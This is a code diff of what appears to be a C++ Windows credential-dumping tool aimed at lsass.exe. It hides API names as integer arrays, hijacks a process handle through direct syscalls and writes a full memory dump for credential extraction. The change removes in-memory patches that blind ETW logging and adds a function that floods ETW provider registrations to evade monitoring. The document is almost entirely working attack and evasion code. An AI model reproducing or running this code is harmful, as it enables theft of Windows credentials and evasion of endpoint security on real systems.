@@ -19,9 +19,7 @@ SIZE_T dumpBufferSize;
 LPVOID dumpBuffer;
 DWORD bytesRead = 0;
 
-constexpr int MVRtN[] = { 82, 101, 97, 100, 86, 105, 114, 116, 117, 97, 108, 77, 101, 109, 111, 114, 121};
-constexpr int MVWtN[] = { 87, 114, 105, 116, 101, 86, 105, 114, 116, 117, 97, 108, 77, 101, 109, 111, 114, 121};
-constexpr int MVPtN[] = { 80, 114, 111, 116, 101, 99, 116, 86, 105, 114, 116, 117, 97, 108, 77, 101, 109, 111, 114, 121};
+
 constexpr int ISQtN[] = { 81, 117, 101, 114, 121, 83, 121, 115, 116, 101, 109, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110};
 constexpr int TPOtN[] = { 79, 112, 101, 110, 80, 114, 111, 99, 101, 115, 115, 84, 111, 107, 101, 110 };
 constexpr int TPAtN[] = { 65, 100, 106, 117, 115, 116, 80, 114, 105, 118, 105, 108, 101, 103, 101, 115, 84, 111, 107, 101, 110 };
@@ -271,37 +269,35 @@ uintptr_t GetOffset(std::string funcName) noexcept {
     }
 }
 
-BOOL PatchMeUpDoc(std::string funcName, BYTE code[]) {
-    const uintptr_t jmpNtPVM = GetOffset(unASCIIme<std::string>(MVPtN));
-    const uintptr_t jmpNtWVM = GetOffset(unASCIIme<std::string>(MVWtN));
-    const int NtPVM = GetVal<int>(unASCIIme<std::string>(MVPtN));
-    const int NtWVM = GetVal<int>(unASCIIme<std::string>(MVWtN));
+void Gluttony() {
+    DWORD status = ERROR_SUCCESS;
+    REGHANDLE RegistrationHandle = NULL;
+    const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} };
+    int count = 0;
+    while (status = EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {
+        count++;
+    }
+    printf("%d\n", count);
+}
 
-    PVOID addr = GetVal<PVOID>(funcName);
-    SIZE_T regionSize = 4096;
-    SIZE_T codeSize = sizeof(code);
-    ULONG protect, oldProtect;
-    NTSTATUS status = STATUS_SUCCESS;
 
-    SetJumpAddress(jmpNtPVM);
-    status = NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect, NtPVM);
-    if (!NT_SUCCESS(status)) {
+BOOL YouMustBeThisTallToRide() {
+    BOOL fIsElevated = FALSE;
+    HANDLE hToken = NULL;
+    TOKEN_ELEVATION elevation;
+    DWORD dwSize;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        if (hToken) CloseHandle(hToken);
         return FALSE;
     }
 
-    SetJumpAddress(jmpNtWVM);
-    status = NtWriteVirtualMemory(NtCurrentProcess(), addr, code, codeSize, NULL, NtWVM);
-    if (!NT_SUCCESS(status)) {
+    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
+        if (hToken) CloseHandle(hToken);
         return FALSE;
     }
 
-    SetJumpAddress(jmpNtPVM);
-    status = NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, oldProtect, &protect, NtPVM);
-    if (!NT_SUCCESS(status)) {
-        return FALSE;
-    }
-
-    return TRUE;
+    fIsElevated = elevation.TokenIsElevated;
 }
 
 BOOL GetPromoted(HANDLE hToken) {
@@ -578,7 +574,6 @@ HANDLE FindersKeepers(LUID luid = { 0,0 }) {
         sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
     } while (sysProcInfo->NextEntryOffset != 0);
 
-    printf("Not Admin\n", status);
     exit(status);
 }
 
@@ -613,6 +608,9 @@ HANDLE HijackHandle(std::string procName) {
     HANDLE hProcess = nullptr;
     HANDLE hDuplicate = nullptr;
     NTSTATUS status = STATUS_SUCCESS;
+
+    int howManyOpenProcessCalls = 0;
+    int howManyNonProcessHandles = 0;
 
     ULONG handleTableInformationSize = sizeof(PSYSTEM_HANDLE_INFORMATION);
     PSYSTEM_HANDLE_INFORMATION handleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInformationSize));
@@ -663,18 +661,13 @@ HANDLE HijackHandle(std::string procName) {
 
         SetJumpAddress(jmpNtOP);
         status = NtOpenProcess(&hProcess, PROCESS_DUP_HANDLE, &objAttr, &clientId, NtOP);
-
-        if (status == STATUS_ACCESS_DENIED)
-            continue;
+        howManyOpenProcessCalls++;
 
         if (NT_SUCCESS(status) && hProcess != nullptr) {
             SetJumpAddress(jmpNtDO);
             status = NtDuplicateObject(hProcess, reinterpret_cast<HANDLE>(handleInfo.HandleValue), NtCurrentProcess(), &hDuplicate, PROCESS_ALL_ACCESS, 0, 0, NtDO);
 
-            if (status == STATUS_ACCESS_DENIED || status == STATUS_NOT_SUPPORTED || status == STATUS_INVALID_HANDLE)
-                continue;
-
-            if (NT_SUCCESS(status)) {
+            if (NT_SUCCESS(status) && hDuplicate != nullptr) {
                 POBJECT_TYPE_INFORMATION objTypeInfo = NULL;
                 ULONG objTypeInfoSize = sizeof(POBJECT_TYPE_INFORMATION);
 
@@ -710,8 +703,14 @@ HANDLE HijackHandle(std::string procName) {
                         }
                     }
                 }
+                else {
+                    howManyNonProcessHandles++;
+                    continue;
+                }
             }
+            else continue;
         }
+        else continue;
     }
     SetJumpAddress(jmpNtC);
     if (hProcess) NtClose(hProcess, NtC);
@@ -757,10 +756,6 @@ BOOL InvokeMiniDump(HANDLE hProcess) {
     HANDLE hSnapshot = nullptr;
     PSS_CAPTURE_FLAGS flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
 
-    BYTE rejectCookies[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x3C };
-    rejectCookies[4] = GetVal<int>(unASCIIme<std::string>(MVRtN));
-    PatchMeUpDoc(unASCIIme<std::string>(MVRtN), rejectCookies);
-
     PssCaptureSnapshot(hProcess, flags, CONTEXT_ALL, (HPSS*)&hSnapshot);
     isDumped = miniDumpWriteDump(hSnapshot, 0, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
     PssFreeSnapshot(NtCurrentProcess(), (HPSS)hSnapshot);
@@ -771,7 +766,7 @@ BOOL InvokeMiniDump(HANDLE hProcess) {
         DWORD fileAttributes = GetFileAttributesW(L"C:\\temp");
         if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
             if (!CreateDirectoryW(L"C:\\temp", NULL)) {
-                printf("create c:\\temp first\n");
+                printf("Create C:\\temp first\n");
                 return 1;
             }
         }
@@ -783,7 +778,7 @@ BOOL InvokeMiniDump(HANDLE hProcess) {
         RtlSecureZeroMemory(dumpBuffer, dumpBufferSize);
         HeapFree(GetProcessHeap(), 0, dumpBuffer);
 
-        wprintf(L"Run `restoresig.py` on %s", filePath);
+        wprintf(L"Run `restoresig.py` on %s\n", filePath);
 
     }
     else wprintf(L"Failed, %s", GetLastErrorMessage().c_str());
@@ -792,34 +787,36 @@ BOOL InvokeMiniDump(HANDLE hProcess) {
 }
 
 int main() {
+    if (!YouMustBeThisTallToRide()) {
+        printf("Not Admin");
+        exit(11);
+    }
+
     printf("PID: %i\n", GetProcessId(NtCurrentProcess()));
-    system("pause");
+
+    Gluttony();
 
     const wchar_t PgbDeS[] = { L'S', L'e', L'D', L'e', L'b', L'u', L'g', L'P', L'r', L'i', L'v', L'i', L'l', L'e', L'g', L'e', L'\0' };
     LUID luid = { 0,0 };
     LookupPrivilegeValueW(NULL, PgbDeS, &luid);
     
     ParseEAT();
-    
-    constexpr int ETtN[] = {84, 114, 97, 99, 101, 69, 118, 101, 110, 116};
-    BYTE returnToSender[] = {0xc3};
-    PatchMeUpDoc(unASCIIme<std::string>(ETtN), returnToSender);
 
-    const char elsauce[] = {'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e', '\0'};
+    const char elsauce[] = { 'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e', '\0' };
 
     HANDLE hToken = nullptr;
     HANDLE hProcess = nullptr;
 
     hToken = FindersKeepers(luid);
-
     if (GetPromoted(hToken)) {
         hProcess = HijackHandle(elsauce);
         InvokeMiniDump(hProcess);
         GetDemoted();
     }
-
+    
     if (hToken) CloseHandle(hToken);
     if (hProcess) CloseHandle(hProcess);
 
+    system("pause");
     return 0;
 }
